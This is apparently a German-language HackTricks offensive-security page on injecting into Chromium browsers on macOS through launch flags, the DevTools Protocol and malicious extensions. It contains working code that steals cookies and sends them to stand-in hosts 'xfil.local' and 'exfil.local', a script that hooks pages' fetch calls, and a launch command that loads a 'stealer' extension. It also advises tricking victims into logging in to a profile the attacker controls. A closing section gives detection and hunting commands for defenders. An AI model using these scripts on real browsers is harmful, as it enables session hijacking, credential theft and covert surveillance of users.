# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Chromium-basierte Browser wie Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi und Opera verwenden alle dieselben Command-Line-Switches, Preference-Dateien und DevTools-Automation-Interfaces. Unter macOS kann jeder Benutzer mit GUI-Zugriff eine bestehende Browser-Session beenden und sie mit beliebigen Flags, Extensions oder DevTools-Endpoints erneut öffnen, die mit den Entitlements des Ziels ausgeführt werden.

#### Chromium mit benutzerdefinierten Flags unter macOS starten

macOS hält pro Chromium-Profil nur eine einzige UI-Instanz aufrecht. Daher muss der Browser für Instrumentierung normalerweise zwangsweise beendet werden (beispielsweise mit `osascript -e 'tell application "Google Chrome" to quit'`). Angreifer starten ihn typischerweise über `open -na "Google Chrome" --args <flags>` neu, sodass sie Argumente einschleusen können, ohne das App-Bundle zu ändern. Wird dieser Befehl in einen benutzerbezogenen LaunchAgent (`~/Library/LaunchAgents/*.plist`) oder einen Login-Hook eingebettet, wird garantiert, dass der manipulierte Browser nach einem Neustart oder Abmelden erneut gestartet wird.

#### `--load-extension` Flag

Das `--load-extension` Flag lädt automatisch entpackte Extensions (durch Kommas getrennte Pfade). In Kombination mit `--disable-extensions-except` können legitime Extensions blockiert werden, während ausschließlich die eigene Payload ausgeführt wird. Malicious Extensions können weitreichende Berechtigungen wie `debugger`, `webRequest` und `cookies anfordern, um in DevTools-Protokolle zu pivotieren, CSP-Header zu patchen, HTTPS herabzustufen oder Session-Material unmittelbar nach dem Browserstart zu exfiltrieren.<sup>[[4]](#references)</sup>

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Diese Switches stellen das Chrome DevTools Protocol (CDP) über TCP oder eine Pipe bereit, sodass externe Tools den Browser steuern können. Google beobachtete eine weitverbreitete Nutzung dieses Interfaces durch Infostealer. Seit Chrome 136 (März 2025) werden die Switches für das Default-Profil ignoriert, sofern der Browser nicht mit einem nicht standardmäßigen `--user-data-dir` gestartet wird. Dadurch wird App-Bound Encryption für echte Profile durchgesetzt. Angreifer können jedoch weiterhin ein neues Profil starten, das Opfer dazu bringen, sich darin zu authentifizieren (Phishing/Triage-Unterstützung), und über CDP Cookies, Tokens, Device-Trust-States oder WebAuthn-Registrierungen abgreifen.<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

Dieses Flag leitet das gesamte Browser-Profil (History, Cookies, Login Data, Preference-Dateien usw.) in einen von Angreifern kontrollierten Pfad um. Es ist erforderlich, wenn moderne Chrome-Versionen mit `--remote-debugging-port` kombiniert werden. Außerdem bleibt das manipulierte Profil isoliert, sodass vorab befüllte `Preferences`- oder `Secure Preferences`-Dateien abgelegt werden können, die Sicherheitsabfragen deaktivieren, Extensions automatisch installieren und Standardschemas ändern.

#### `--use-fake-ui-for-media-stream` Flag

Dieser Switch umgeht die Berechtigungsabfrage für Kamera und Mikrofon, sodass jede Seite, die `getUserMedia` aufruft, sofort Zugriff erhält. In Kombination mit Flags wie `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` oder CDP-`Browser.grantPermissions`-Befehlen können Audio und Video, der Desktop oder WebRTC-Berechtigungsprüfungen ohne Benutzerinteraktion unbemerkt erfasst beziehungsweise erfüllt werden.<sup>[[4]](#references)</sup>

## In freier Wildbahn beobachtete Delivery- und Relaunch-Muster

CDP abuse ist üblicherweise eine **post-exploitation**-Phase und nicht die initiale Payload. Eine aktuelle macOS-Kampagne, die sich gegen Entwickler richtete, verwendete eine manipulierte Xcode-**`Run Script` Build-Phase** (`PBXShellScriptBuildPhase`), sodass Code nur ausgeführt wurde, wenn das Opfer das Projekt **baute**, nicht bereits beim bloßen Klonen oder Öffnen. Nach dieser ersten Ausführung infizierte die Malware außerdem weitere `.xcodeproj`-Verzeichnisse, fügte bösartige Git-`pre-commit`-Hooks hinzu und durchsuchte ZIP-Archive nach weiteren Xcode-Projekten.<sup>[[3]](#references)</sup>

Für Chromium abuse ist dies relevant, weil der Angreifer nicht die Browser-Binary selbst patchen muss. Ein kurzlebiger Build-Phase- / `osascript`-Stager kann stattdessen einen **Browser-Wrapper** (LaunchAgent, Login-Item, Dock-Eintrag, trojanisierten App-Launcher usw.) installieren, der den legitimen Browser jedes Mal, wenn der Benutzer ihn startet, mit vom Angreifer kontrollierten Flags erneut öffnet.<sup>[[3]](#references)</sup>

> [!TIP]
> Untersuchen Sie auf Entwickler-Endpunkten `.pbxproj`-Dateien, `.git/hooks/pre-commit` und ZIPs mit `.xcodeproj` auf unerwartete Vorkommen von `curl`, `osascript`, `xxd`, verschachteltem `base64` oder Chrome-Relaunch-Logik.

## Remote Debugging und DevTools Protocol Abuse

Sobald Chrome mit einem dedizierten `--user-data-dir` und `--remote-debugging-port` erneut gestartet wurde, kann über CDP (z. B. mittels `chrome-remote-interface`, `puppeteer` oder `playwright`) eine Verbindung hergestellt werden, um Workflows mit weitreichenden Berechtigungen zu skripten:

- **Cookie-/Session-Diebstahl:** `Network.getAllCookies` und `Storage.getCookies` geben HttpOnly-Werte zurück, selbst wenn App-Bound Encryption normalerweise den Zugriff auf das Dateisystem blockieren würde, da CDP den laufenden Browser auffordert, sie zu entschlüsseln.
- **Berechtigungsmanipulation:** `Browser.grantPermissions` und `Emulation.setGeolocationOverride` ermöglichen das Umgehen von Kamera-/Mikrofonabfragen (insbesondere in Kombination mit `--use-fake-ui-for-media-stream`) oder das Fälschen standortbasierter Sicherheitsprüfungen.
- **Keystroke-/Script-Injection:** `Runtime.evaluate` führt beliebiges JavaScript innerhalb des aktiven Tabs aus und ermöglicht das Abgreifen von Zugangsdaten, das Patchen des DOM oder das Injizieren von Persistence-Beacons, die Navigationen überstehen.<sup>[[1]](#references)</sup>
- **Live-Exfiltration:** `Network.webRequestWillBeSentExtraInfo` und `Fetch.enable` fangen authentifizierte Requests und Responses in Echtzeit ab, ohne Artefakte auf dem Datenträger zu hinterlassen.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Da Chrome 136 CDP im Standardprofil blockiert, liefert das Kopieren des vorhandenen Verzeichnisses `~/Library/Application Support/Google/Chrome` des Opfers in einen Staging-Pfad keine entschlüsselten Cookies mehr. Bringe den Benutzer stattdessen durch Social Engineering dazu, sich innerhalb des instrumentierten Profils zu authentifizieren (z. B. während einer „hilfreichen“ Support-Sitzung), oder erfasse MFA-Tokens während der Übertragung über CDP-controlled network hooks.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

Ein praktisches Malware-Muster ist:

1. Das Userland-Implantat oder den Wrapper bei jedem Start von Chrome neu starten.
2. Den legitimen Browser mit `--remote-debugging-port=<port>` und bei Chrome 136+ üblicherweise mit einem zugehörigen nicht standardmäßigen `--user-data-dir=<dir>` starten.
3. Einen Helper starten, der sich mit dem lokalen CDP-WebSocket verbindet und mit `Page.addScriptToEvaluateOnNewDocument` einen Pre-Document-Hook registriert.<sup>[[2]](#references)</sup>

Dieser Helper kann JavaScript **bevor** der Site-Code ausgeführt wird einschleusen. Das eignet sich ideal zum Hooken von `window.fetch`, `XMLHttpRequest`, Wallet-Providern oder Autofill-Flows, ohne Dateien auf der Festplatte zu patchen.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Eine leistungsfähigere Variante verwandelt den Browser in eine **Host-Command-Bridge**: Eingeschleustes JavaScript gibt ein mit einem Trennzeichen versehenes `console.log` aus, der lokale Helfer überwacht `Runtime.consoleAPICalled`, entfernt die Markierung, führt den verbleibenden Teil über die Host-Shell aus (zum Beispiel über Go's `exec.Command`) und gibt stdout/stderr über den WebSocket des Angreifers zurück. Dadurch wird die Script-Ausführung auf Tab-Ebene zu einer weitgehend fileless reverse shell erweitert.<sup>[[3]](#references)</sup>

## Extension-basierte Injection über die Debugger API

Die 2023 veröffentlichte Forschung "Chrowned by an Extension" zeigte, dass eine bösartige Extension über die API `chrome.debugger` eine Verbindung zu jedem Tab herstellen und dieselben DevTools-Funktionen wie `--remote-debugging-port` erlangen kann.<sup>[[6]](#references)</sup> Dadurch werden die ursprünglichen Isolationsannahmen aufgehoben (Extensions bleiben in ihrem Kontext), und Folgendes wird ermöglicht:

- Lautloser Diebstahl von Cookies und Credentials mit `Network.getAllCookies`/`Fetch.getResponseBody`.
- Änderung von Site-Berechtigungen (Kamera, Mikrofon, Geolocation) sowie Umgehung von Security-Interstitials, wodurch Phishing-Seiten Chrome-Dialoge imitieren können.
- Manipulation von TLS-Warnungen, Downloads oder WebAuthn-Prompts auf dem Übertragungsweg durch programmgesteuerte Aufrufe von `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` oder `Security.handleCertificateError`.

Lade die Extension mit `--load-extension`/`--disable-extensions-except`, sodass keine Benutzerinteraktion erforderlich ist. Ein minimales Background-Script, das die API weaponized, sieht folgendermaßen aus:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Die Extension kann außerdem `Debugger.paused`-Events abonnieren, um JavaScript-Variablen zu lesen, Inline-Scripts zu patchen oder benutzerdefinierte Breakpoints zu setzen, die Navigationen überstehen. Da alles innerhalb der GUI-Sitzung des Benutzers ausgeführt wird, werden Gatekeeper und TCC nicht ausgelöst. Dadurch eignet sich diese Technik ideal für Malware, die bereits eine Ausführung im Benutzerkontext erreicht hat.<sup>[[6]](#references)</sup>

## Erkennung & Hunting

- Alarme auslösen, wenn Chromium-Browser mit `--remote-debugging-port`, `--remote-debugging-pipe` oder einem verdächtigen `--user-data-dir` gestartet werden, insbesondere wenn der Parent-Prozess `bash`, `sh`, `osascript`, `xcodebuild` oder ein LaunchAgent-Helper ist.
- Nach kurzen Ketten suchen, in denen ein Helper einen lokalen CDP-WebSocket öffnet, `Page.addScriptToEvaluateOnNewDocument` registriert und anschließend eine langlebige ausgehende WebSocket-/HTTPS-Verbindung herstellt.
- Nach Console-to-Shell-Bridges suchen, indem die Browseraktivität von `Runtime.consoleAPICalled` mit Child-Shells oder Helper-Prozessen korreliert wird, die vom Angreifer bereitgestellte commands ausführen.
- Auf Entwickler-Macs `.pbxproj`-Einträge vom Typ `PBXShellScriptBuildPhase`, Git-`pre-commit`-Hooks, Dock-/Login-Item-Relauncher und ZIP-enthaltene Xcode-Projekte auf die Installation von Browser-Wrappern überprüfen.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Tools

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatisiert Chromium-Starts mit Payload-Erweiterungen und stellt interaktive CDP-Hooks bereit.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Ähnliche Tools mit Fokus auf Traffic-Interception und Browser-Instrumentierung für macOS-Operatoren.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js-Bibliothek zum Scripten von Chrome-DevTools-Protocol-Dumps (Cookies, DOM, Berechtigungen), sobald eine Instanz mit aktivem `--remote-debugging-port` läuft.

### Example
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Finde weitere Beispiele in den Tools-Links.

## Referenzen

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: Eine eingehende Analyse der neuesten XCSSET-Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) auf X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Änderungen an Schaltern für Remote-Debugging zur Verbesserung der Sicherheit - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Missbrauch des Chrome DevTools Protocol über die Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
